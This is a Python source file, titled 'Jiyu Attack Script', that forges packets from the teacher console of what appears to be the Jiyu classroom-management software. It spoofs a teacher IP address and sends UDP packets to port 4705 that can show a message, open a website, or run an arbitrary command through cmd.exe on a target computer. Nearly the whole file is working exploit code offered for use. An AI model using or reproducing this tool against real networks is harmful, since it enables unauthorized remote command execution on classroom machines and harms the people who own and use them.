"""
Jiyu Attack Script

This script implements a Jiyu attack by sending specially crafted UDP packets to a target IP address.
It allows the user to input a message, which is then formatted and packaged into a byte array before being sent.

The script uses Scapy for packet manipulation and sending.
"""

import argparse
import secrets

from typing import Literal, Optional

from sender import broadcast_packet


def format_data(data: str, max_length: Optional[int] = None) -> bytes:
    """
    Formats a string into a byte array, ensuring it is within the specified maximum length.

    Args:
        msg (str): The input string to format.
        max_length (int, optional): The maximum length of the resulting byte array. Defaults to 800.

    Returns:
        bytes: The formatted byte array, padded with null bytes if necessary.
    """
    if not isinstance(data, str):
        raise TypeError(f"Expected string, got {type(data).__name__}")
    if max_length is None:
        return data.encode("utf-16le")
    if not isinstance(max_length, int):
        raise TypeError(f"Expected int, got {type(max_length).__name__}")
    if max_length <= 0:
        raise ValueError(f"Invalid maximum length: {max_length}")
    return data.encode("utf-16le").ljust(max_length, b"\x00")[:max_length]


def pkg_message(msg: str) -> bytes:
    """
    Packages a message string into a specific byte format, including a header and padding.

    Args:
        msg (str): The message string to package.

    Returns:
        bytes: The packaged message as a byte array, including a header and padding.

    Raises:
        ValueError: If the message length exceeds 800 bytes or if the header length is incorrect
    """
    data = format_data(msg, 800)
    head = (
        b"DMOC\x00\x00\x01\x00\x9e\x03\x00\x00"
        + secrets.token_bytes(16)
        + b" N\x00\x00\xc0\xa8l\x01\x91\x03\x00\x00"
        + b"\x91\x03\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00"
    )
    return head + data + b"\x00" * 98


def pkg_execute(
    executable_file: str,
    arguments: str = "",
    mode: Literal["normal", "minimize", "maximize"] = "normal",
) -> bytes:
    """
    Packages a command with an executable file and optional arguments into a specific byte format.

    Args:
        executable_file (str): The name of the executable file to run.
        arguments (str, optional): The command-line arguments to pass to the executable. Defaults to an empty string.
        mode (Literal["normal", "minimize", "maximize"], optional): The mode of execution. Defaults to "normal".

    Returns:
        bytes: The packaged command as a byte array, including a header and formatted data.

    Raises:
        ValueError: If the executable file or arguments exceed their respective length limits,
                     or if an invalid mode is specified.
        TypeError: If the executable file or arguments are not strings.

    Note:
        The function constructs a specific header and formats the executable file and arguments
        into byte arrays, ensuring they fit within defined length limits.
    """
    head = (
        b"DMOC\x00\x00\x01\x00n\x03\x00\x00"
        + secrets.token_bytes(16)
        + b" N\x00\x00\xc0\xa8\xe9\x01a\x03\x00\x00a\x03\x00\x00"
        + b"\x00\x02\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x01\x00\x00\x00"
    )
    data0 = format_data(executable_file, 512)
    data1 = format_data(arguments, 254)
    match mode:
        case "normal":
            data2 = b"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        case "minimize":
            data2 = b"\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        case "maximize":
            data2 = b"\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        case _:
            raise ValueError(f"Invalid mode: {mode}")
    return head + data0 + data1 + b"\x00" * 66 + data2


def pkg_website(url: str) -> bytes:
    """
    Packages a website URL into a specific byte format, including a header and padding.

    Args:
        url (str): The website URL to package.

    Returns:
        bytes: The packaged URL as a byte array, including a header and padding.

    Raises:
        ValueError: If the URL length exceeds 800 bytes.
        TypeError: If the URL is not a string.
    """
    data = format_data(url)

    len1 = len(data) + 36
    len2 = len1 - 13
    siz1 = len1.to_bytes(4, "little")
    siz2 = len2.to_bytes(4, "little")
    siz2 = siz2[1:] + siz2[0:1]

    head = (
        b"DMOC\x00\x00\x01\x00"
        + siz1
        + secrets.token_bytes(25)
        + siz2
        + b"\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00"
    )

    return head + data + b"\x00" * 4


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Jiyu Attack Script")
    parser.add_argument("-s", "--teacher-ip", type=str, required=True, help="Teacher's IP address")
    parser.add_argument("-t", "--target", type=str, required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=4705, help="Port to send packets to (default: 4705)")

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-m", "--message", type=str, help="Message to send")
    group.add_argument("-w", "--website", type=str, help="Website URL to ask to open")
    group.add_argument("-c", "--command", type=str, help="Command to execute on the target")

    args = parser.parse_args()
    teacher_ip = args.teacher_ip
    target = args.target
    port = args.port
    if args.message:
        payload = pkg_message(args.message)
    elif args.website:
        payload = pkg_website(args.website)
    elif args.command:
        payload = pkg_execute("cmd.exe", f'/D /C "{args.command}"', "minimize")
    else:
        raise ValueError("Either message or website must be provided")

    broadcast_packet(teacher_ip, target, port, payload)
    print(f"Packet sent to {target} on port {port} with payload length {len(payload)} bytes")
